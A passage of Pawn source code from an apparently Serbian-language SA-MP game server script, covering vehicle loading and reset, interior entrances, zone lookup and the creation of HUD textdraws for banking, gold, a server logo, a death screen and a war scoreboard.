	VehicleInfo[ i ][ vMelee ] = 0;
	VehicleInfo[ i ][ vWeap1 ] = 0;
	VehicleInfo[ i ][ vAmmo1 ] = 0;
	VehicleInfo[ i ][ vWeap2 ] = 0;
	VehicleInfo[ i ][ vAmmo2 ] = 0;
	VehicleInfo[ i ][ vGajbica ][ 0 ] = -1;
	VehicleInfo[ i ][ vGajbica ][ 1 ] = -1;
	VehicleInfo[ i ][ vGajbica ][ 2 ] = -1;
	VehicleInfo[ i ][ vGajbica ][ 3 ] = -1;
	VehicleInfo[ i ][ vGajbica ][ 4 ] = -1;
	VehicleInfo[ i ][ vGajbicaAmmount ][ 0 ] = 0;
    VehicleInfo[ i ][ vGajbicaAmmount ][ 1 ] = 0;
    VehicleInfo[ i ][ vGajbicaAmmount ][ 2 ] = 0;
    VehicleInfo[ i ][ vGajbicaAmmount ][ 3 ] = 0;
    VehicleInfo[ i ][ vGajbicaAmmount ][ 4 ] = 0;
    VehicleInfo[ i ][ vNeaktivnost ] = 0;
	VehicleInfo[ i ][ vKilometri ] = 0;
	VehicleInfo[ i ][ vMetri ] = 0;
	VehicleInfo[ i ][ vID ] = -1;
    VehicleInfo[ i ][ vCipovanje ] = 0;
}
//------------------------------------------------------------------------------
stock ObrisiVozilo( autoid )
{
	new string[64];
	format(string, sizeof(string), V_FILE, autoid);
    if( fexist( string ) ) { fremove(string); }
	return 1;
}
//------------------------------------------------------------------------------
stock KreirajInterijer(ime[], Float:XUlaz, Float:YUlaz, Float:ZUlaz, Float:XIzlaz, Float:YIzlaz, Float:ZIzlaz, eIntID, IntIDx, vwID, vwIDx)
{

	intide++;
	strmid(IntInfo[intide][iIme], ime, 0, strlen(ime), 255);
	IntInfo[intide][iXUlaz] = XUlaz;
	IntInfo[intide][iYUlaz] = YUlaz;
	IntInfo[intide][iZUlaz] = ZUlaz;
	IntInfo[intide][iXIzlaz] = XIzlaz;
	IntInfo[intide][iYIzlaz] = YIzlaz;
	IntInfo[intide][iZIzlaz] = ZIzlaz;
	IntInfo[intide][iIntID] = eIntID;
	IntInfo[intide][iIntIDSpolja] = IntIDx;
	IntInfo[intide][iVwID] = vwID;
	IntInfo[intide][iVwIDSpolja] = vwIDx;

    new string[128];
    format(string, sizeof(string), ""SRVBOJA1SCM"[ %s ]\n"col_white"Za ulaz pritisnite 'F' ili 'ENTER'", ime);
    Create3DandP(string, XUlaz, YUlaz, ZUlaz, IntIDx, vwIDx, 19133, 20.0);
    format(string, sizeof(string), ""SRVBOJA1SCM"[ %s ]\n"col_white"Za izlaz pritisnite 'F' ili 'ENTER'", ime);
    Create3DandP(string, XIzlaz, YIzlaz, ZIzlaz, eIntID, vwID, 19133, 20.0);
	return 1;
}
//------------------------------------------------------------------------------
stock LoadVehicles( ) {

    for( new i = 1; i < MAX_CARS; i++ ) {
    
        VehicleInfo[ i ][ vID ] = -1;
		new vFile[50];
        format( vFile, sizeof( vFile ), V_FILE, i );
        if( fexist( vFile ) ) {
        
            INI_ParseFile( vFile, "OcitajVozilo", .bExtra = true, .extra = i );

            VehicleInfo[ i ][ vID ] = -1;
            VehicleInfo[ i ][ vProvera ] = i;
            if( VehicleInfo[ i ][ vModel ] != 0 ) {
            
				VehicleInfo[ i ][ vID ] = V01D_CreateVehicle(VehicleInfo[ i ][ vModel ], VehicleInfo[ i ][ vLokacijaX ], VehicleInfo[ i ][ vLokacijaY ], VehicleInfo[ i ][ vLokacijaZ ]+1.0, VehicleInfo[ i ][ vLokacijaA ], VehicleInfo[ i ][ vColor1 ], VehicleInfo[ i ][ vColor2 ], 300000 );
                LinkVehicleToInterior( VehicleInfo[ i ][ vID ], VehicleInfo[ i ][ vInterior ] );
                SetVehicleVirtualWorld( VehicleInfo[ i ][ vID ], VehicleInfo[ i ][ vVirtualWorld ] );
				vCanDrive[ VehicleInfo[ i ][ vID ] ] = 1; 
                
                SetVehicleParamsEx( VehicleInfo[ i ][ vID ], 0, 0, 0, VehicleInfo[ i ][ vLocked ], 0, 0, 0 );
                if( IsVehicleBajs( VehicleInfo[ i ][ vID ] ) ) {
					SetVehicleParamsEx( VehicleInfo[ i ][ vID ], 1, 0, 0, VehicleInfo[ i ][ vLocked ], 0, 0, 0 );
				}
                ResetVehicleStatistics( VehicleInfo[ i ][ vID ] );
				VehicleInfo[ i ][ vFuel ] = getAmountFuel( VehicleInfo[ i ][ vID ] );

    			if( VehicleInfo[ i ][ vUsage ] == PRIVATNO_VOZILO ) {
    			    Fuel[ VehicleInfo[ i ][ vID ] ] = VehicleInfo[ i ][ vFuel ];
    			}
				else {
				    Fuel[ VehicleInfo[ i ][ vID ] ] = getAmountFuel( VehicleInfo[ i ][ vID ] );
				}
			
				new h = VehicleInfo[ i ][ vID ];
				if( VehicleInfo[ i ][ vReg ] == 1 ) {
		            SetTablice( h );
				}
				if( VehicleInfo[ i ][ vReg ] == 0 ) {
		            SetVehicleNumberPlate( h, "NEMA" );
				}
				
				TuneVehicle( i );

            	SaveVehicle( i );
            }
            else if( VehicleInfo[ i ][ vModel ] == 0 ) {
            
                ResetVehicle( i );
				ObrisiVozilo( i );
                fremove( vFile );
            }
            //printf( "AddStaticVehicle_V( %d, %f, %f, %f, %f, %d, %d, %d, %d, %d )", VehicleInfo[ i ][ vModel ], VehicleInfo[ i ][ vLokacijaX ], VehicleInfo[ i ][ vLokacijaY ], VehicleInfo[ i ][ vLokacijaZ ], VehicleInfo[ i ][ vLokacijaA ], VehicleInfo[ i ][ vColor1 ], VehicleInfo[ i ][ vColor2 ], VehicleInfo[ i ][ vUsage ], VehicleInfo[ i ][ vOrganization ], VehicleInfo[ i ][ vJob ] );
		}
	}
}

stock vehicleCheck() {

    for( new i = 1; i < MAX_CARS; i++ ) {
    
        new vFile[50];
        format( vFile, sizeof( vFile ), V_FILE, i );
        if( fexist( vFile ) ) {

            if(!strcmp( VehicleInfo[i][vOwner], "Drzava", true )) {

                printf("Brisem vozilo ID : %d zato sto je Drzava", i);
                fremove( vFile );
                continue;
            }
        }
    }
}
//------------------------------------------------------------------------------
stock GetVehicleZone(h, zone[], len)
{
	new Float:x22, Float:y22;

	new Float:x,
	    Float:y,
		Float:z;

	GetVehiclePos(h, x, y, z);

	x22 = x; y22 = y;
	for( new i = 0; i != sizeof(gSAZones); i++ )
	{
		if(x22 >= gSAZones[ i ][SAZONE_AREA][0] && x22 <= gSAZones[ i ][SAZONE_AREA][ 3 ] && y22 >= gSAZones[ i ][SAZONE_AREA][1] && y22 <= gSAZones[ i ][SAZONE_AREA][4])
		{
		    return format(zone, len, gSAZones[ i ][SAZONE_NAME], 0);
		}
	}
	return 0;
}
//------------------------------------------------------------------------------
stock CreateTextDraws( ) {
	
    InGame_TD[0] = TextDrawCreate(206.500000, 435.237487, "box");
    TextDrawLetterSize(InGame_TD[0], 0.000000, 1.099999);
    TextDrawTextSize(InGame_TD[0], 663.000000, 0.000000);
    TextDrawAlignment(InGame_TD[0], 1);
    TextDrawColor(InGame_TD[0], -1);
    TextDrawUseBox(InGame_TD[0], 1);
    TextDrawBoxColor(InGame_TD[0], -1);
    TextDrawSetShadow(InGame_TD[0], 0);
    TextDrawSetOutline(InGame_TD[0], 0);
    TextDrawBackgroundColor(InGame_TD[0], 255);
    TextDrawFont(InGame_TD[0], 1);
    TextDrawSetProportional(InGame_TD[0], 1);
    TextDrawSetShadow(InGame_TD[0], 0);

    InGame_TD[1] = TextDrawCreate(192.000000, 429.987487, "ld_beat:chit");
    TextDrawLetterSize(InGame_TD[1], 0.000000, 0.000000);
    TextDrawTextSize(InGame_TD[1], 23.000000, 20.300006);
    TextDrawAlignment(InGame_TD[1], 1);
    TextDrawColor(InGame_TD[1], -1);
    TextDrawSetShadow(InGame_TD[1], 0);
    TextDrawSetOutline(InGame_TD[1], 0);
    TextDrawBackgroundColor(InGame_TD[1], 255);
    TextDrawFont(InGame_TD[1], 4);
    TextDrawSetProportional(InGame_TD[1], 0);
    TextDrawSetShadow(InGame_TD[1], 0);

    InGame_TD[2] = TextDrawCreate(206.500000, 435.737518, "box");
    TextDrawLetterSize(InGame_TD[2], 0.000000, 0.995000);
    TextDrawTextSize(InGame_TD[2], 663.000000, 0.000000);
    TextDrawAlignment(InGame_TD[2], 1);
    TextDrawColor(InGame_TD[2], 219685375);
    TextDrawUseBox(InGame_TD[2], 1);
    TextDrawBoxColor(InGame_TD[2], 219685375);
    TextDrawSetShadow(InGame_TD[2], 0);
    TextDrawSetOutline(InGame_TD[2], 0);
    TextDrawBackgroundColor(InGame_TD[2], 255);
    TextDrawFont(InGame_TD[2], 1);
    TextDrawSetProportional(InGame_TD[2], 1);
    TextDrawSetShadow(InGame_TD[2], 0);

    InGame_TD[3] = TextDrawCreate(193.600067, 430.687530, "ld_beat:chit");
    TextDrawLetterSize(InGame_TD[3], 0.000000, 0.000000);
    TextDrawTextSize(InGame_TD[3], 20.000000, 18.890020);
    TextDrawAlignment(InGame_TD[3], 1);
    TextDrawColor(InGame_TD[3], 219685375);
    TextDrawSetShadow(InGame_TD[3], 0);
    TextDrawSetOutline(InGame_TD[3], 0);
    TextDrawBackgroundColor(InGame_TD[3], 255);
    TextDrawFont(InGame_TD[3], 4);
    TextDrawSetProportional(InGame_TD[3], 0);
    TextDrawSetShadow(InGame_TD[3], 0);

    InGame_TD[4] = TextDrawCreate(281.500000, 438.062500, "UKOLIKO_VAM_JE_POTREBNA_POMOC_KORISTI_/PITAJ.");
    TextDrawLetterSize(InGame_TD[4], 0.119000, 0.445000);
    TextDrawAlignment(InGame_TD[4], 2);
    TextDrawColor(InGame_TD[4], -1);
    TextDrawSetShadow(InGame_TD[4], 0);
    TextDrawSetOutline(InGame_TD[4], 0);
    TextDrawBackgroundColor(InGame_TD[4], 255);
    TextDrawFont(InGame_TD[4], 2);
    TextDrawSetProportional(InGame_TD[4], 1);
    TextDrawSetShadow(InGame_TD[4], 0);

    InGame_TD[5] = TextDrawCreate(366.000000, 435.000000, "...");
    TextDrawLetterSize(InGame_TD[5], 0.227499, 0.803750);
    TextDrawAlignment(InGame_TD[5], 1);
    TextDrawColor(InGame_TD[5], -1);
    TextDrawSetShadow(InGame_TD[5], 0);
    TextDrawSetOutline(InGame_TD[5], 0);
    TextDrawBackgroundColor(InGame_TD[5], 255);
    TextDrawFont(InGame_TD[5], 1);
    TextDrawSetProportional(InGame_TD[5], 1);
    TextDrawSetShadow(InGame_TD[5], 0);

    InGame_TD[6] = TextDrawCreate(398.000000, 435.000000, "BANKA");
    TextDrawLetterSize(InGame_TD[6], 0.143999, 0.523750);
    TextDrawAlignment(InGame_TD[6], 1);
    TextDrawColor(InGame_TD[6], -1061109505);
    TextDrawSetShadow(InGame_TD[6], 0);
    TextDrawSetOutline(InGame_TD[6], 0);
    TextDrawBackgroundColor(InGame_TD[6], 255);
    TextDrawFont(InGame_TD[6], 2);
    TextDrawSetProportional(InGame_TD[6], 1);
    TextDrawSetShadow(InGame_TD[6], 0);

    InGame_TD[7] = TextDrawCreate(456.500000, 435.000000, "ZLATO");
    TextDrawLetterSize(InGame_TD[7], 0.143999, 0.523750);
    TextDrawAlignment(InGame_TD[7], 1);
    TextDrawColor(InGame_TD[7], -1061109505);
    TextDrawSetShadow(InGame_TD[7], 0);
    TextDrawSetOutline(InGame_TD[7], 0);
    TextDrawBackgroundColor(InGame_TD[7], 255);
    TextDrawFont(InGame_TD[7], 2);
    TextDrawSetProportional(InGame_TD[7], 1);
    TextDrawSetShadow(InGame_TD[7], 0);

    InGame_TD[8] = TextDrawCreate(496.000000, 435.000000, "...");
    TextDrawLetterSize(InGame_TD[8], 0.227499, 0.803750);
    TextDrawAlignment(InGame_TD[8], 1);
    TextDrawColor(InGame_TD[8], -1);
    TextDrawSetShadow(InGame_TD[8], 0);
    TextDrawSetOutline(InGame_TD[8], 0);
    TextDrawBackgroundColor(InGame_TD[8], 255);
    TextDrawFont(InGame_TD[8], 1);
    TextDrawSetProportional(InGame_TD[8], 1);
    TextDrawSetShadow(InGame_TD[8], 0);

    InGame_TD[9] = TextDrawCreate(22.000000, 437.625000, "box");
    TextDrawLetterSize(InGame_TD[9], 0.000000, 0.500001);
    TextDrawTextSize(InGame_TD[9], 90.000000, 0.000000);
    TextDrawAlignment(InGame_TD[9], 1);
    TextDrawColor(InGame_TD[9], -1);
    TextDrawUseBox(InGame_TD[9], 1);
    TextDrawBoxColor(InGame_TD[9], 219685375);
    TextDrawSetShadow(InGame_TD[9], 0);
    TextDrawSetOutline(InGame_TD[9], 0);
    TextDrawBackgroundColor(InGame_TD[9], 255);
    TextDrawFont(InGame_TD[9], 1);
    TextDrawSetProportional(InGame_TD[9], 1);
    TextDrawSetShadow(InGame_TD[9], 0);

    InGame_TD[10] = TextDrawCreate(85.000000, 433.962463, "ld_beat:chit");
    TextDrawLetterSize(InGame_TD[10], 0.000000, 0.000000);
    TextDrawTextSize(InGame_TD[10], 12.669992, 11.889997);
    TextDrawAlignment(InGame_TD[10], 1);
    TextDrawColor(InGame_TD[10], 219685375);
    TextDrawSetShadow(InGame_TD[10], 0);
    TextDrawSetOutline(InGame_TD[10], 0);
    TextDrawBackgroundColor(InGame_TD[10], 255);
    TextDrawFont(InGame_TD[10], 4);
    TextDrawSetProportional(InGame_TD[10], 0);
    TextDrawSetShadow(InGame_TD[10], 0);

    InGame_TD[11] = TextDrawCreate(13.500000, 433.962463, "ld_beat:chit");
    TextDrawLetterSize(InGame_TD[11], 0.000000, 0.000000);
    TextDrawTextSize(InGame_TD[11], 12.669992, 11.889997);
    TextDrawAlignment(InGame_TD[11], 1);
    TextDrawColor(InGame_TD[11], 219685375);
    TextDrawSetShadow(InGame_TD[11], 0);
    TextDrawSetOutline(InGame_TD[11], 0);
    TextDrawBackgroundColor(InGame_TD[11], 255);
    TextDrawFont(InGame_TD[11], 4);
    TextDrawSetProportional(InGame_TD[11], 0);
    TextDrawSetShadow(InGame_TD[11], 0);

    InGame_TD[12] = TextDrawCreate(539.500000, 439.812500, "25.12.2021");
    TextDrawLetterSize(InGame_TD[12], 0.143999, 0.523750);
    TextDrawAlignment(InGame_TD[12], 2);
    TextDrawColor(InGame_TD[12], -1);
    TextDrawSetShadow(InGame_TD[12], 0);
    TextDrawSetOutline(InGame_TD[12], 0);
    TextDrawBackgroundColor(InGame_TD[12], 255);
    TextDrawFont(InGame_TD[12], 2);
    TextDrawSetProportional(InGame_TD[12], 1);
    TextDrawSetShadow(InGame_TD[12], 0);

    InGame_TD[13] = TextDrawCreate(539.000000, 435.000000, "20:00");
    TextDrawLetterSize(InGame_TD[13], 0.143999, 0.523750);
    TextDrawAlignment(InGame_TD[13], 2);
    TextDrawColor(InGame_TD[13], -1);
    TextDrawSetShadow(InGame_TD[13], 0);
    TextDrawSetOutline(InGame_TD[13], 0);
    TextDrawBackgroundColor(InGame_TD[13], 255);
    TextDrawFont(InGame_TD[13], 2);
    TextDrawSetProportional(InGame_TD[13], 1);
    TextDrawSetShadow(InGame_TD[13], 0);

    InGame_TD[14] = TextDrawCreate(574.000000, 435.000000, "...");
    TextDrawLetterSize(InGame_TD[14], 0.227499, 0.803750);
    TextDrawAlignment(InGame_TD[14], 1);
    TextDrawColor(InGame_TD[14], -1);
    TextDrawSetShadow(InGame_TD[14], 0);
    TextDrawSetOutline(InGame_TD[14], 0);
    TextDrawBackgroundColor(InGame_TD[14], 255);
    TextDrawFont(InGame_TD[14], 1);
    TextDrawSetProportional(InGame_TD[14], 1);
    TextDrawSetShadow(InGame_TD[14], 0);

    InGame_TD[15] = TextDrawCreate(608.000000, 435.000000, "999");
    TextDrawLetterSize(InGame_TD[15], 0.143999, 0.523750);
    TextDrawAlignment(InGame_TD[15], 2);
    TextDrawColor(InGame_TD[15], -1);
    TextDrawSetShadow(InGame_TD[15], 0);
    TextDrawSetOutline(InGame_TD[15], 0);
    TextDrawBackgroundColor(InGame_TD[15], 255);
    TextDrawFont(InGame_TD[15], 2);
    TextDrawSetProportional(InGame_TD[15], 1);
    TextDrawSetShadow(InGame_TD[15], 0);

    InGame_TD[16] = TextDrawCreate(608.500000, 440.250000, "999");
    TextDrawLetterSize(InGame_TD[16], 0.143999, 0.523750);
    TextDrawAlignment(InGame_TD[16], 2);
    TextDrawColor(InGame_TD[16], -1);
    TextDrawSetShadow(InGame_TD[16], 0);
    TextDrawSetOutline(InGame_TD[16], 0);
    TextDrawBackgroundColor(InGame_TD[16], 255);
    TextDrawFont(InGame_TD[16], 2);
    TextDrawSetProportional(InGame_TD[16], 1);
    TextDrawSetShadow(InGame_TD[16], 0);

    InGame_TD[17] = TextDrawCreate(552.000000, -0.475036, "ld_beat:chit");
    TextDrawLetterSize(InGame_TD[17], 0.000000, 0.000000);
    TextDrawTextSize(InGame_TD[17], 49.000000, 41.000000);
    TextDrawAlignment(InGame_TD[17], 1);
    TextDrawColor(InGame_TD[17], 219685375);
    TextDrawSetShadow(InGame_TD[17], 0);
    TextDrawSetOutline(InGame_TD[17], 0);
    TextDrawBackgroundColor(InGame_TD[17], 255);
    TextDrawFont(InGame_TD[17], 4);
    TextDrawSetProportional(InGame_TD[17], 0);
    TextDrawSetShadow(InGame_TD[17], 0);

    InGame_TD[18] = TextDrawCreate(554.999389, 2.124963, "ld_beat:chit");
    TextDrawLetterSize(InGame_TD[18], 0.000000, 0.000000);
    TextDrawTextSize(InGame_TD[18], 43.000000, 35.900016);
    TextDrawAlignment(InGame_TD[18], 1);
    TextDrawColor(InGame_TD[18], -1);
    TextDrawSetShadow(InGame_TD[18], 0);
    TextDrawSetOutline(InGame_TD[18], 0);
    TextDrawBackgroundColor(InGame_TD[18], 255);
    TextDrawFont(InGame_TD[18], 4);
    TextDrawSetProportional(InGame_TD[18], 0);
    TextDrawSetShadow(InGame_TD[18], 0);

    InGame_TD[19] = TextDrawCreate(557.299560, 4.049964, "ld_beat:chit");
    TextDrawLetterSize(InGame_TD[19], 0.000000, 0.000000);
    TextDrawTextSize(InGame_TD[19], 38.559906, 32.000000);
    TextDrawAlignment(InGame_TD[19], 1);
    TextDrawColor(InGame_TD[19], 219685375);
    TextDrawSetShadow(InGame_TD[19], 0);
    TextDrawSetOutline(InGame_TD[19], 0);
    TextDrawBackgroundColor(InGame_TD[19], 255);
    TextDrawFont(InGame_TD[19], 4);
    TextDrawSetProportional(InGame_TD[19], 0);
    TextDrawSetShadow(InGame_TD[19], 0);

    InGame_TD[20] = TextDrawCreate(559.499511, 6.337464, "ld_beat:chit");
    TextDrawLetterSize(InGame_TD[20], 0.000000, 0.000000);
    TextDrawTextSize(InGame_TD[20], 34.000000, 27.600013);
    TextDrawAlignment(InGame_TD[20], 1);
    TextDrawColor(InGame_TD[20], -1);
    TextDrawSetShadow(InGame_TD[20], 0);
    TextDrawSetOutline(InGame_TD[20], 0);
    TextDrawBackgroundColor(InGame_TD[20], 255);
    TextDrawFont(InGame_TD[20], 4);
    TextDrawSetProportional(InGame_TD[20], 0);
    TextDrawSetShadow(InGame_TD[20], 0);

    InGame_TD[21] = TextDrawCreate(559.799926, 18.500000, "box");
    TextDrawLetterSize(InGame_TD[21], 0.000000, 0.449999);
    TextDrawTextSize(InGame_TD[21], 593.000000, 0.000000);
    TextDrawAlignment(InGame_TD[21], 1);
    TextDrawColor(InGame_TD[21], -1);
    TextDrawUseBox(InGame_TD[21], 1);
    TextDrawBoxColor(InGame_TD[21], 219685375);
    TextDrawSetShadow(InGame_TD[21], 0);
    TextDrawSetOutline(InGame_TD[21], 0);
    TextDrawBackgroundColor(InGame_TD[21], 255);
    TextDrawFont(InGame_TD[21], 1);
    TextDrawSetProportional(InGame_TD[21], 1);
    TextDrawSetShadow(InGame_TD[21], 0);

    InGame_TD[22] = TextDrawCreate(558.500000, 16.750000, "VALHALLA");
    TextDrawLetterSize(InGame_TD[22], 0.228000, 0.799375);
    TextDrawAlignment(InGame_TD[22], 1);
    TextDrawColor(InGame_TD[22], -1);
    TextDrawSetShadow(InGame_TD[22], 0);
    TextDrawSetOutline(InGame_TD[22], 0);
    TextDrawBackgroundColor(InGame_TD[22], 255);
    TextDrawFont(InGame_TD[22], 1);
    TextDrawSetProportional(InGame_TD[22], 1);
    TextDrawSetShadow(InGame_TD[22], 0);

    InGame_TD[23] = TextDrawCreate(568.000000, 16.750000, "box");
    TextDrawLetterSize(InGame_TD[23], 0.000000, -0.150000);
    TextDrawTextSize(InGame_TD[23], 569.000000, 0.000000);
    TextDrawAlignment(InGame_TD[23], 1);
    TextDrawColor(InGame_TD[23], -1);
    TextDrawUseBox(InGame_TD[23], 1);
    TextDrawBoxColor(InGame_TD[23], 219685375);
    TextDrawSetShadow(InGame_TD[23], 0);
    TextDrawSetOutline(InGame_TD[23], 0);
    TextDrawBackgroundColor(InGame_TD[23], 255);
    TextDrawFont(InGame_TD[23], 1);
    TextDrawSetProportional(InGame_TD[23], 1);
    TextDrawSetShadow(InGame_TD[23], 0);

    InGame_TD[24] = TextDrawCreate(570.699340, 15.549995, "box");
    TextDrawLetterSize(InGame_TD[24], 0.000000, 0.114999);
    TextDrawTextSize(InGame_TD[24], 571.499877, 0.000000);
    TextDrawAlignment(InGame_TD[24], 1);
    TextDrawColor(InGame_TD[24], -1);
    TextDrawUseBox(InGame_TD[24], 1);
    TextDrawBoxColor(InGame_TD[24], 219685375);
    TextDrawSetShadow(InGame_TD[24], 0);
    TextDrawSetOutline(InGame_TD[24], 0);
    TextDrawBackgroundColor(InGame_TD[24], 255);
    TextDrawFont(InGame_TD[24], 1);
    TextDrawSetProportional(InGame_TD[24], 1);
    TextDrawSetShadow(InGame_TD[24], 0);

    InGame_TD[25] = TextDrawCreate(573.998535, 16.249998, "box");
    TextDrawLetterSize(InGame_TD[25], 0.000000, 0.114999);
    TextDrawTextSize(InGame_TD[25], 572.599609, 0.000000);
    TextDrawAlignment(InGame_TD[25], 1);
    TextDrawColor(InGame_TD[25], -1);
    TextDrawUseBox(InGame_TD[25], 1);
    TextDrawBoxColor(InGame_TD[25], 219685375);
    TextDrawSetShadow(InGame_TD[25], 0);
    TextDrawSetOutline(InGame_TD[25], 0);
    TextDrawBackgroundColor(InGame_TD[25], 255);
    TextDrawFont(InGame_TD[25], 1);
    TextDrawSetProportional(InGame_TD[25], 1);
    TextDrawSetShadow(InGame_TD[25], 0);

    InGame_TD[26] = TextDrawCreate(576.897827, 15.049993, "box");
    TextDrawLetterSize(InGame_TD[26], 0.000000, 0.114999);
    TextDrawTextSize(InGame_TD[26], 579.599853, 0.000000);
    TextDrawAlignment(InGame_TD[26], 1);
    TextDrawColor(InGame_TD[26], -1);
    TextDrawUseBox(InGame_TD[26], 1);
    TextDrawBoxColor(InGame_TD[26], 219685375);
    TextDrawSetShadow(InGame_TD[26], 0);
    TextDrawSetOutline(InGame_TD[26], 0);
    TextDrawBackgroundColor(InGame_TD[26], 255);
    TextDrawFont(InGame_TD[26], 1);
    TextDrawSetProportional(InGame_TD[26], 1);
    TextDrawSetShadow(InGame_TD[26], 0);

    InGame_TD[27] = TextDrawCreate(582.796386, 16.549999, "box");
    TextDrawLetterSize(InGame_TD[27], 0.000000, 0.114999);
    TextDrawTextSize(InGame_TD[27], 585.498413, 0.000000);
    TextDrawAlignment(InGame_TD[27], 1);
    TextDrawColor(InGame_TD[27], -1);
    TextDrawUseBox(InGame_TD[27], 1);
    TextDrawBoxColor(InGame_TD[27], 219685375);
    TextDrawSetShadow(InGame_TD[27], 0);
    TextDrawSetOutline(InGame_TD[27], 0);
    TextDrawBackgroundColor(InGame_TD[27], 255);
    TextDrawFont(InGame_TD[27], 1);
    TextDrawSetProportional(InGame_TD[27], 1);
    TextDrawSetShadow(InGame_TD[27], 0);

    InGame_TD[28] = TextDrawCreate(578.897338, 13.649988, "box");
    TextDrawLetterSize(InGame_TD[28], 0.000000, -0.035000);
    TextDrawTextSize(InGame_TD[28], 577.331054, 0.000000);
    TextDrawAlignment(InGame_TD[28], 1);
    TextDrawColor(InGame_TD[28], -1);
    TextDrawUseBox(InGame_TD[28], 1);
    TextDrawBoxColor(InGame_TD[28], 219685375);
    TextDrawSetShadow(InGame_TD[28], 0);
    TextDrawSetOutline(InGame_TD[28], 0);
    TextDrawBackgroundColor(InGame_TD[28], 255);
    TextDrawFont(InGame_TD[28], 1);
    TextDrawSetProportional(InGame_TD[28], 1);
    TextDrawSetShadow(InGame_TD[28], 0);

    InGame_TD[29] = TextDrawCreate(641.500000, 50.000000, "");
    TextDrawLetterSize(InGame_TD[29], 0.000000, 0.000000);
    TextDrawTextSize(InGame_TD[29], 23.000000, 29.000000);
    TextDrawAlignment(InGame_TD[29], 1);
    TextDrawColor(InGame_TD[29], -1);
    TextDrawSetShadow(InGame_TD[29], 0);
    TextDrawSetOutline(InGame_TD[29], 0);
    TextDrawBackgroundColor(InGame_TD[29], 0);
    TextDrawFont(InGame_TD[29], 5);
    TextDrawSetProportional(InGame_TD[29], 0);
    TextDrawSetShadow(InGame_TD[29], 0);
    TextDrawSetPreviewModel(InGame_TD[29], 19064);
    TextDrawSetPreviewRot(InGame_TD[29], 0.000000, 0.000000, 0.000000, 1.000000);

    ////////////////////////////////////////////////////////

    PozadinaTD = TextDrawCreate(-9.000000, -13.466670, "box");
    TextDrawLetterSize(PozadinaTD, 0.000000, 60.349998);
    TextDrawTextSize(PozadinaTD, 738.000000, 0.000000);
    TextDrawAlignment(PozadinaTD, 1);
    TextDrawColor(PozadinaTD, -1);
    TextDrawUseBox(PozadinaTD, 1);
    TextDrawBoxColor(PozadinaTD, 153);
    TextDrawSetShadow(PozadinaTD, 0);
    TextDrawBackgroundColor(PozadinaTD, 255);
    TextDrawFont(PozadinaTD, 1);
    TextDrawSetProportional(PozadinaTD, 1);

    WastedTD[0] = TextDrawCreate(-3.333346, 111.185180, "box");
    TextDrawLetterSize(WastedTD[0], 0.000000, 17.124998);
    TextDrawTextSize(WastedTD[0], 667.000000, 0.000000);
    TextDrawAlignment(WastedTD[0], 1);
    TextDrawColor(WastedTD[0], -1);
    TextDrawUseBox(WastedTD[0], 1);
    TextDrawBoxColor(WastedTD[0], 170);
    TextDrawSetShadow(WastedTD[0], 0);
    TextDrawBackgroundColor(WastedTD[0], 255);
    TextDrawFont(WastedTD[0], 1);
    TextDrawSetProportional(WastedTD[0], 1);

    WastedTD[1] = TextDrawCreate(272.916595, 172.370376, "WASTED");
    TextDrawLetterSize(WastedTD[1], 0.666249, 2.792592);
    TextDrawAlignment(WastedTD[1], 1);
    TextDrawColor(WastedTD[1], -2147483393);
    TextDrawSetShadow(WastedTD[1], 0);
    TextDrawBackgroundColor(WastedTD[1], 255);
    TextDrawFont(WastedTD[1], 3);
    TextDrawSetProportional(WastedTD[1], 1);

}

stock WarTDControl( playerid, bool:show ) {
    if( show == true ) {

        WARTextDraw[ playerid ][ 0 ] = CreatePlayerTextDraw(playerid,640.000000, 220.000000, "          ");
        PlayerTextDrawBackgroundColor(playerid,WARTextDraw[ playerid ][ 0 ], 255);
        PlayerTextDrawFont(playerid,WARTextDraw[ playerid ][ 0 ], 1);
        PlayerTextDrawLetterSize(playerid,WARTextDraw[ playerid ][ 0 ], 0.500000, 1.000000);
        PlayerTextDrawColor(playerid,WARTextDraw[ playerid ][ 0 ], -1);
        PlayerTextDrawSetOutline(playerid,WARTextDraw[ playerid ][ 0 ], 0);
        PlayerTextDrawSetProportional(playerid,WARTextDraw[ playerid ][ 0 ], 1);
        PlayerTextDrawSetShadow(playerid,WARTextDraw[ playerid ][ 0 ], 1);
        PlayerTextDrawUseBox(playerid,WARTextDraw[ playerid ][ 0 ], 1);
        PlayerTextDrawBoxColor(playerid,WARTextDraw[ playerid ][ 0 ], 150);
        PlayerTextDrawTextSize(playerid,WARTextDraw[ playerid ][ 0 ], 500.000000, 40.000000);
        PlayerTextDrawSetSelectable(playerid,WARTextDraw[ playerid ][ 0 ], 0);

        WARTextDraw[ playerid ][ 1 ] = CreatePlayerTextDraw(playerid,567.000000, 220.000000, "WAR");
        PlayerTextDrawAlignment(playerid,WARTextDraw[ playerid ][ 1 ], 2);
        PlayerTextDrawBackgroundColor(playerid,WARTextDraw[ playerid ][ 1 ], 255);
        PlayerTextDrawFont(playerid,WARTextDraw[ playerid ][ 1 ], 2);
        PlayerTextDrawLetterSize(playerid,WARTextDraw[ playerid ][ 1 ], 0.419999, 0.899999);
        PlayerTextDrawColor(playerid,WARTextDraw[ playerid ][ 1 ], SRVBOJA1 );
        PlayerTextDrawSetOutline(playerid,WARTextDraw[ playerid ][ 1 ], 0);
        PlayerTextDrawSetProportional(playerid,WARTextDraw[ playerid ][ 1 ], 1);
        PlayerTextDrawSetShadow(playerid,WARTextDraw[ playerid ][ 1 ], 1);
        PlayerTextDrawSetSelectable(playerid,WARTextDraw[ playerid ][ 1 ], 0);

        WARTextDraw[ playerid ][ 2 ] = CreatePlayerTextDraw(playerid,568.000000, 227.000000, "-");
        PlayerTextDrawAlignment(playerid,WARTextDraw[ playerid ][ 2 ], 2);
        PlayerTextDrawBackgroundColor(playerid,WARTextDraw[ playerid ][ 2 ], 255);
        PlayerTextDrawFont(playerid,WARTextDraw[ playerid ][ 2 ], 2);
        PlayerTextDrawLetterSize(playerid,WARTextDraw[ playerid ][ 2 ], 12.080010, 0.899999);
        PlayerTextDrawColor(playerid,WARTextDraw[ playerid ][ 2 ], -1);
        PlayerTextDrawSetOutline(playerid,WARTextDraw[ playerid ][ 2 ], 0);
        PlayerTextDrawSetProportional(playerid,WARTextDraw[ playerid ][ 2 ], 1);
        PlayerTextDrawSetShadow(playerid,WARTextDraw[ playerid ][ 2 ], 1);
        PlayerTextDrawSetSelectable(playerid,WARTextDraw[ playerid ][ 2 ], 0);

        WARTextDraw[ playerid ][ 3 ] = CreatePlayerTextDraw(playerid,527.000000, 234.000000, "Team 1");
